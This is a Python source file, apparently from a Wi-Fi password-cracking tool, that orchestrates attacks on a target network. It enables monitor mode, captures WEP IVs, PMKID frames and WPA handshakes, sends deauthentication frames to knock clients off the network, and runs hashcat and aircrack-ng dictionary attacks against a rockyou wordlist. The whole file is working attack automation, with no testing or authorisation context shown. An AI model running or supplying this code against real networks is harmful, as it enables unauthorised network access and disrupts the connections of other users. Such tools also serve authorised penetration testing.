"""Unified attack orchestrator — tries all applicable methods in sequence.

Runs in a background thread.  Progress is reported via log_cb(message, level)
and the final result via result_cb(password_or_None).
"""

import subprocess
import threading
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, List, Optional

from .system import (
    IS_WINDOWS,
    check_tool,
    enable_monitor_mode,
    disable_monitor_mode,
    get_hashcat_dir,
)
from . import aircrack, hashcat_tool, hcx


@dataclass
class AttackTarget:
    ssid: str
    bssid: str
    channel: int
    encryption: str  # e.g. "WPA2", "WEP", "WPA3", "WPA"


LogCallback = Callable[[str, str], None]          # (message, level)
ResultCallback = Callable[[Optional[str]], None]  # cracked_password or None

# Common wordlist locations to try automatically when no path is given
_COMMON_WORDLISTS: List[str] = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/dict/words",
]


def find_default_wordlist() -> Optional[str]:
    """Return first wordlist found in common locations, or None."""
    for path in _COMMON_WORDLISTS:
        if Path(path).exists():
            return path
    here = Path(__file__).parent.parent.parent
    for candidate in [
        here / "wordlists" / "rockyou.txt",
        here / "rockyou.txt",
        here / "wordlist.txt",
    ]:
        if candidate.exists():
            return str(candidate)
    return None


class UnifiedAttacker:
    """Tries every applicable attack against one target network."""

    CAPTURE_SECS = 60    # seconds per capture phase
    CRACK_TIMEOUT = 300  # seconds for hashcat/aircrack per phase

    def __init__(
        self,
        target: AttackTarget,
        interface: str,
        wordlist: Optional[str],
        output_dir: Path,
        log_cb: LogCallback,
        result_cb: ResultCallback,
    ) -> None:
        self.target = target
        self.interface = interface
        self.wordlist = wordlist or find_default_wordlist()
        self.output_dir = output_dir
        self._log = log_cb
        self._on_result = result_cb
        self._stop = threading.Event()
        self._current_proc: Optional[subprocess.Popen] = None
        self._monitor_iface: Optional[str] = None

    def stop(self) -> None:
        """Signal the attacker to stop and kill any running subprocess."""
        self._stop.set()
        proc = self._current_proc
        if proc is not None:
            try:
                proc.terminate()
            except Exception:
                pass

    def run(self) -> None:
        """Main attack sequence — call this from a background thread."""
        self.output_dir.mkdir(parents=True, exist_ok=True)
        enc = self.target.encryption.upper()
        password: Optional[str] = None

        try:
            # Enable monitor mode
            self._log("Enabling monitor mode...", "info")
            ok, result = enable_monitor_mode(self.interface)
            if ok:
                self._monitor_iface = result
                self._log(f"Monitor mode active: {result}", "success")
            else:
                self._monitor_iface = self.interface
                self._log(f"Monitor mode failed: {result}", "warn")
                self._log("Continuing in managed mode (capture may fail)", "warn")

            if self._stop.is_set():
                self._on_result(None)
                return

            # Route by encryption type
            if "WEP" in enc:
                password = self._phase_wep()
            else:
                # 1. PMKID (clientless — no associated client required)
                if not self._stop.is_set() and check_tool("hashcat"):
                    password = self._phase_pmkid()
                # 2. 4-Way handshake + dictionary
                if not password and not self._stop.is_set():
                    password = self._phase_handshake()

        finally:
            if self._monitor_iface and self._monitor_iface != self.interface:
                disable_monitor_mode(self._monitor_iface)
                self._log("Monitor mode disabled", "info")

        self._on_result(password)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _stream(
        self,
        cmd: List[str],
        timeout: Optional[int] = None,
        cwd: Optional[str] = None,
    ) -> int:
        """Spawn *cmd*, stream stdout+stderr to log_cb, return exit code."""
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                cwd=cwd,
            )
        except FileNotFoundError:
            self._log(f"Command not found: {cmd[0]}", "error")
            return 1
        except Exception as exc:
            self._log(str(exc), "error")
            return 1

        self._current_proc = proc
        deadline = time.monotonic() + timeout if timeout else None

        for line in iter(proc.stdout.readline, ""):
            if self._stop.is_set() or (deadline and time.monotonic() > deadline):
                proc.terminate()
                break
            text = line.rstrip()
            if text:
                self._log(text, "output")

        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        self._current_proc = None
        return proc.returncode

    def _prefix(self, name: str) -> str:
        return str(self.output_dir / name)

    # ------------------------------------------------------------------
    # Phase: WEP
    # ------------------------------------------------------------------

    def _phase_wep(self) -> Optional[str]:
        self._log("--- Phase: WEP Attack (PTW/FMS) ---", "phase")

        if not check_tool("airodump-ng"):
            self._log("airodump-ng not found -- skipping WEP", "warn")
            return None

        prefix = self._prefix("wep_cap")
        secs = self.CAPTURE_SECS * 2
        self._log(f"Capturing IVs from '{self.target.ssid}' for {secs}s...", "info")

        self._stream(
            [
                "airodump-ng",
                "-c", str(self.target.channel),
                "--bssid", self.target.bssid,
                "-w", prefix,
                "--output-format", "pcap",
                self._monitor_iface,
            ],
            timeout=secs,
        )

        if self._stop.is_set():
            return None

        caps = sorted(self.output_dir.glob("wep_cap*.cap"))
        if not caps:
            self._log("No WEP capture file produced", "error")
            return None

        self._log("Running aircrack-ng PTW/FMS statistical crack...", "info")
        ok, output, key = aircrack.crack_wep(str(caps[-1]))
        if key:
            self._log(f"WEP key: {key}", "success")
            return key

        self._log("WEP crack failed -- not enough IVs or wrong key space", "warn")
        return None

    # ------------------------------------------------------------------
    # Phase: PMKID (clientless WPA2)
    # ------------------------------------------------------------------

    def _phase_pmkid(self) -> Optional[str]:
        self._log("--- Phase: PMKID Attack (clientless) ---", "phase")

        if not self.wordlist:
            self._log("No wordlist configured -- skipping PMKID crack", "warn")

        cap_file = self._prefix("pmkid.pcapng")
        hash_file = self._prefix("pmkid.hc22000")

        self._log(f"Capturing PMKID frames for {self.CAPTURE_SECS}s...", "info")

        if IS_WINDOWS and not check_tool("hcxdumptool"):
            done = threading.Event()

            def _win_cap() -> None:
                from .pcap_utils import capture_pmkid_eapol
                try:
                    capture_pmkid_eapol(
                        self._monitor_iface, cap_file,
                        bssid_filter=self.target.bssid,
                    )
                finally:
                    done.set()

            t = threading.Thread(target=_win_cap, daemon=True)
            t.start()
            done.wait(timeout=self.CAPTURE_SECS)
        else:
            if not check_tool("hcxdumptool"):
                self._log("hcxdumptool not found -- skipping PMKID", "warn")
                return None

            import os as _os, tempfile as _tf
            tmp = _tf.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            tmp.write(self.target.bssid.replace(":", "").lower() + "\n")
            tmp.close()

            self._stream(
                [
                    "hcxdumptool", "-i", self._monitor_iface,
                    "-o", cap_file, "--enable_status=3",
                    f"--filterlist_ap={tmp.name}", "--filtermode=2",
                ],
                timeout=self.CAPTURE_SECS,
            )
            _os.unlink(tmp.name)

        if self._stop.is_set():
            return None

        cap_path = Path(cap_file)
        if not cap_path.exists() or cap_path.stat().st_size == 0:
            self._log("No PMKID data captured", "warn")
            return None

        self._log("Converting capture to hc22000 format...", "info")
        ok, msg = hcx.convert_to_hashcat(cap_file, hash_file)
        hash_path = Path(hash_file)
        if not ok or not hash_path.exists() or hash_path.stat().st_size == 0:
            self._log(f"Conversion: {msg or 'no hashes extracted'}", "warn")
            return None

        if not self.wordlist:
            return None

        self._log(f"hashcat -m 22801 | wordlist: {Path(self.wordlist).name}", "info")
        self._stream(
            ["hashcat", "-m", "22801", hash_file, self.wordlist, "--force", "--quiet"],
            timeout=self.CRACK_TIMEOUT,
            cwd=get_hashcat_dir(),
        )

        if self._stop.is_set():
            return None

        ok, out = hashcat_tool.show_cracked(hash_file, 22801)
        if ok and out.strip():
            password = out.strip().split(":")[-1]
            self._log(f"PMKID cracked -- password: {password}", "success")
            return password

        self._log("PMKID attack exhausted wordlist", "warn")
        return None

    # ------------------------------------------------------------------
    # Phase: WPA/WPA2 4-Way Handshake
    # ------------------------------------------------------------------

    def _phase_handshake(self) -> Optional[str]:
        self._log("--- Phase: WPA/WPA2 Handshake Attack ---", "phase")

        if not check_tool("airodump-ng"):
            self._log("airodump-ng not found -- skipping handshake capture", "warn")
            return None

        prefix = self._prefix("hs_cap")
        hash_file = self._prefix("hs.hc22000")

        self._log(
            f"Starting capture on '{self.target.ssid}' for {self.CAPTURE_SECS}s...", "info"
        )

        cap_proc = subprocess.Popen(
            [
                "airodump-ng",
                "-c", str(self.target.channel),
                "--bssid", self.target.bssid,
                "-w", prefix,
                "--output-format", "pcap",
                self._monitor_iface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self._current_proc = cap_proc

        time.sleep(5)

        if not self._stop.is_set() and check_tool("aireplay-ng"):
            self._log("Sending deauth frames to force client reconnection...", "info")
            ok, msg = aircrack.deauth(
                self._monitor_iface, self.target.bssid, count=10
            )
            self._log(
                "Deauth sent" if ok else f"Deauth: {msg}",
                "info" if ok else "warn",
            )

        remaining = self.CAPTURE_SECS - 5
        self._log(f"Waiting up to {remaining}s for 4-way handshake...", "info")
        for _ in range(remaining):
            if self._stop.is_set():
                break
            time.sleep(1)

        cap_proc.terminate()
        try:
            cap_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            cap_proc.kill()
        self._current_proc = None

        if self._stop.is_set():
            return None

        caps = sorted(
            list(self.output_dir.glob("hs_cap*.cap"))
            + list(self.output_dir.glob("hs_cap*.pcap"))
        )
        if not caps:
            self._log("No handshake capture file found", "error")
            return None

        cap_file = str(caps[-1])
        has_hs, _ = aircrack.check_handshake(cap_file)
        self._log(
            "Handshake captured!" if has_hs
            else "No handshake detected -- attempting crack anyway...",
            "success" if has_hs else "warn",
        )

        # Try hashcat first (faster with GPU)
        if check_tool("hashcat") and self.wordlist:
            ok, _ = hashcat_tool.convert_pcap(cap_file, hash_file)
            hash_path = Path(hash_file)
            if ok and hash_path.exists() and hash_path.stat().st_size > 0:
                self._log(
                    f"hashcat -m 22000 | wordlist: {Path(self.wordlist).name}", "info"
                )
                self._stream(
                    [
                        "hashcat", "-m", "22000", hash_file, self.wordlist,
                        "--force", "--quiet",
                    ],
                    timeout=self.CRACK_TIMEOUT,
                    cwd=get_hashcat_dir(),
                )
                if not self._stop.is_set():
                    ok, out = hashcat_tool.show_cracked(hash_file, 22000)
                    if ok and out.strip():
                        password = out.strip().split(":")[-1]
                        self._log(
                            f"Handshake cracked (hashcat) -- password: {password}", "success"
                        )
                        return password

        # Fallback: aircrack-ng CPU dictionary attack
        if check_tool("aircrack-ng") and self.wordlist and not self._stop.is_set():
            self._log("Falling back to aircrack-ng dictionary attack...", "info")
            ok, _, key = aircrack.crack_wpa(
                cap_file,
                self.wordlist,
                bssid=self.target.bssid,
                ssid=self.target.ssid,
            )
            if key:
                self._log(
                    f"Handshake cracked (aircrack) -- password: {key}", "success"
                )
                return key

        self._log("Handshake attack exhausted wordlist", "warn")
        return None
